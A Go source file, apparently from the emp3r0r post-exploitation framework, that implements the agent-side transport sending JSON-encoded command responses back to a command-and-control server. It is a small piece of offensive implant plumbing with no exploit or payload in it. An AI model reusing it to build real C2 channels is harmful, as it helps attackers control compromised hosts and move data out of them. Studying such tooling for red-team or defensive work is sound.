package c2transport

import (
	"encoding/json"
	"errors"
	"fmt"
	"log"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/spf13/cobra"
)

// Send2CC send TunData to CC
func Send2CC(data *def.MsgTunData) error {
	out := json.NewEncoder(def.CCMsgConn)

	err := out.Encode(data)
	if err != nil {
		return errors.New("Send2CC: " + err.Error())
	}
	return nil
}

// C2RespPrintf send response to a cobra command to CC, like fmt.Printf
func C2RespPrintf(cmd *cobra.Command, format string, args ...interface{}) {
	msg := def.MsgTunData{
		Tag: common.RuntimeConfig.AgentTag,
	}
	cmd_id, _ := cmd.Flags().GetString("cmd_id")
	cmdSlice := []string{cmd.Name()}
	msg.CmdID = cmd_id
	msg.CmdSlice = cmdSlice
	msg.Response = fmt.Sprintf(format, args...)
	if err := Send2CC(&msg); err != nil {
		log.Println(err)
	}
	log.Printf("Response sent: %s", msg.Response)
}
